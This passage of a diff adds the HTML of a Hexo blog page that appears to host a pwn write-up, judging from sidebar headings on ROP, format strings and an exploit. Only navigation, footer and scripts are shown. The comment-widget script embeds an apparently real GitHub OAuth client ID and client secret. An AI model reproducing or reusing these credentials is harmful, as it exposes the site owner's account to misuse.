rop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-format-string"><span class="nav-number">4.2.3.2.</span> <span class="nav-text">0x00 format string</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-具体做法"><span class="nav-number">4.2.4.</span> <span class="nav-text">0x03 具体做法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-遇到问题"><span class="nav-number">4.3.</span> <span class="nav-text">0x02 遇到问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-exploit-2"><span class="nav-number">4.4.</span> <span class="nav-text">0x03 exploit</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="PwnHt"
+    src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">PwnHt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pwnht" title="GitHub &rarr; https://github.com/pwnht" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/05171683@cumt.edu.cn" title="E-Mail &rarr; 05171683@cumt.edu.cn"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3nd.xyz/" title="https://3nd.xyz/" rel="noopener" target="_blank">3ND</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://dayjun.top/" title="https://dayjun.top/" rel="noopener" target="_blank">哒君</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://iyzyi.com/" title="http://iyzyi.com/" rel="noopener" target="_blank">iyzyi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">PwnHt</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: '0c9c9c5050bd212943da',
+      clientSecret: 'e88bf594e600fa4c1956d2ff2b5aeab8ea9ece28',
+      repo: 'gitalk-commnet',
+      owner: 'pwnht',
+      admin: ['pwnht'],
+      id: '42fdbd19f7be4f33098fc8f4cbe21c48',
+        language: 'zh-CN',
+      distractionFreeMode: 'false'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
